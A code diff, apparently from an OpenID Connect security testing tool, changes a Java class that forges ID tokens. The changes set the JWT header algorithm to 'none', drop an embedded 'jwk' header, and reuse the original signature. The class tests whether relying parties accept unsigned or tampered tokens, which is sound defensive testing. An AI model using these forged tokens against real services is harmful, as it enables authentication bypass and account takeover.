@@ -21,7 +21,6 @@ import com.nimbusds.jose.JWSAlgorithm;
 import com.nimbusds.jose.JWSHeader;
 import com.nimbusds.jose.util.Base64URL;
 import com.nimbusds.jwt.JWT;
-import com.nimbusds.jwt.PlainJWT;
 import com.nimbusds.jwt.SignedJWT;
 import com.nimbusds.oauth2.sdk.ParseException;
 import com.nimbusds.oauth2.sdk.id.ClientID;
@@ -49,12 +48,10 @@ public class SignatureManipulationOP extends DefaultOP {
 		try {
 			if (sigInvalid && sigNone) {
 				JSONObject newHdr = origJwt.getHeader().toJSONObject();
-				newHdr.put("alg", "none");
+				newHdr.replace("alg", "none");
 				Base64URL newHdr64 = Base64URL.encode(newHdr.toString());
 
-				byte[] newSig = origJwt.getSignature().decode();
-				newSig[0] = (byte) (newSig[0] ^ 0xFF); // flip bits in first byte
-				Base64URL newSig64 = Base64URL.encode(newSig);
+				Base64URL newSig64 = origJwt.getSignature();
 
 				Base64URL newPayload = origJwt.getPayload().toBase64URL();
 
@@ -74,7 +71,8 @@ public class SignatureManipulationOP extends DefaultOP {
 				return newJwt;
 			} else if (sigNone) {
 				JSONObject newHdr = origJwt.getHeader().toJSONObject();
-				newHdr.put("alg", "none");
+				newHdr.replace("alg", "none");
+				newHdr.remove("jwk");
 				Base64URL newHdr64 = Base64URL.encode(newHdr.toString());
 
 				Base64URL newPayload = origJwt.getPayload().toBase64URL();
